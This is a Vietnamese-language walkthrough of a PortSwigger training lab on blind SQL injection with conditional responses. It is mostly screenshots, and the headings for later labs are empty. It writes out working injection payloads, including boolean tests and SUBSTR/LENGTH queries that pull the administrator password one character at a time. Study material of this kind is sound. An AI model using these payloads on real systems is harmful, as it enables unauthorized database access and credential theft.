# [Lab 11: Blind SQLi with conditional responses]()
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/37ad9743-6580-48f3-ba12-fea8f2e1e44d)

trang web chính
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/987b0575-42d5-492b-9bec-0254487eb039)

message `Welcome back!`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/7e2fd235-25a3-43b0-998e-69a773e82377)

thêm `'`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/2e7dddc5-0bbb-4a19-8977-c229b04a383c)

message `Welcome back!` biến mất
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/6778550f-7e9e-48e3-b7fd-c57c80804c66)

thêm `--`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/4b71cdc2-415e-431a-a748-130d904f7dd8)

message đã trở lại --> SQLi ở trackingId
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/7b78da5b-74c8-456d-a6e8-1b24833f1398)

`ORDER BY 1`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/b460477b-719b-4ee0-9a11-f99a2ab72931)

`' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/4c560ca7-32ba-4f6d-aa36-14f8406c46d6)
chỉ hiện message Welcome back! câu truy vấn chính xác nhưng không có kết quả trả về mà chỉ có hiện message hay không --> True: hiện message, False: không hiện message

`AND 1=0` --> không hiện message
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/60af5c3f-d3f5-4217-93df-5528bde1aa04)

`AND 1=1` --> hiện message
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/4cc60215-e352-442c-9818-c7b333999958)

--> ta sẽ đưa các điều kiện để khai thác dữ liệu

message xuất hiện --> có username là administrator từ bảng users
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/521b7439-d994-4bbd-8d46-d4ea1816e81c)

`' AND (SELECT LENGTH(password)=§1§ FROM users WHERE username='administrator')--`
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/faeb5c5e-80dd-4563-a5a6-c788035cf6c7)

password có 20 ký tự
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/e0ffd916-4cbe-4da9-9547-61f6984b0a60)

tìm từng ký tự thôi

`' AND (SELECT SUBSTR(password,§1§,1)='§a§' FROM users WHERE username='administrator')--`

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/b11970b0-5185-4ae9-8942-be9c87d391a8)

![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/ca1a5338-7740-4259-a7f1-80c0f13c77e9)

login and solve the lab
![image](https://github.com/imHy0/Port_Swigger_Learning/assets/88024759/a3a65d89-e1aa-4416-8a6b-105aa9245a56)

# [Lab 12: Blind SQLi with conditional errors]()


# [Lab 13: Visible error-based SQLi]()


# [Lab 14: Blind SQLi with time delays]()


# [Lab 15: Blind SQLi with time delays and information retrieval]()


# [Lab 18: SQLi with filter bypass via XML encoding]()
